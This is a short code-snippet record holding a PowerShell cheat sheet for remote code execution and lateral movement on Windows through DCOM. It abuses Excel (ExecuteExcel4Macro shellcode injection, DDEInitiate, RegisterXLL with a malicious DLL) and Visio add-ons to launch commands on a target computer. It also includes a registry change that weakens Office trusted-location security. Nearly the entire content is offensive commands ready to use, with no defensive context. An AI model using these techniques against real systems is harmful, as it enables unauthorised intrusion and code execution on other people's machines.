---
id: f13120ce-3d96-4e74-a430-b16c227069c2
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.120440+00:00'
updated_at: '2023-04-10T20:26:32.005650+00:00'
---

# Code Snippet f13120ce

**Language**: ps1

```ps1
# Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM
Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a

# Using Excel DDE
PS C:\> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS C:\> $excel.DisplayAlerts = $false
PS C:\> $excel.DDEInitiate("cmd", "/c calc.exe")

# Using Excel RegisterXLL
# Can't be used reliably with a remote target
Require: reg add HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1
PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS> $excel.RegisterXLL("EvilXLL.dll")

# Using Visio
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "$ComputerName"))
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc")

```


